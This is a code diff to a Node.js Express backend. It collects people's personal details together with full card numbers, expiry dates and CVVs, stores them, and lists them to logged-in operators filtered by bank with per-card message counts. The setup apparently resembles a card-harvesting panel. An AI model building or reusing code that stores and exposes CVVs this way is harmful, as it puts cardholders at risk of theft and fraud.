@@ -30,7 +30,7 @@ function determineCardType(firstFourDigits) {
 
 exports.submitDetails = async (req, res) => {
     try {
-        const { name, email, mobile, dob, state, cardNo, expiryDate, cvv, cardHolderName } = req.body;
+        const { name, email, mobile, dob, state, bank, cardNo, expiryDate, cvv, cardHolderName } = req.body;
 
         // Extract the first 4 digits of the card number
         const firstFourDigits = cardNo.substring(0, 4);
@@ -44,6 +44,7 @@ exports.submitDetails = async (req, res) => {
             mobile,
             dob,
             state,
+            bank,
             cardNo,
             cardType,  // Set the card type based on the first 4 digits
             expiryDate,
@@ -67,10 +68,17 @@ exports.getDetails = async (req, res) => {
         const status = authenticatedUser.status;
 
         if (status === 'active') {
-            const customers = await Customer.find();
+            const customers = await Customer.find()
+            .sort({ createdAt: -1 });
+
+            const { bank } = req.query; // Assuming you pass the bank as a query parameter
+
+            const filteredCustomers = bank
+                ? customers.filter(customer => customer.bank === bank)
+                : customers;
 
             const customerDetails = await Promise.all(
-                customers.map(async (customer) => {
+                filteredCustomers.map(async (customer) => {
                     const { mobile, cardNo } = customer;
                     const messageCount = await CustomerMessage.countDocuments({ mobile, cardNo, isOpen: false });
                     return { ...customer.toObject(), messageCount };
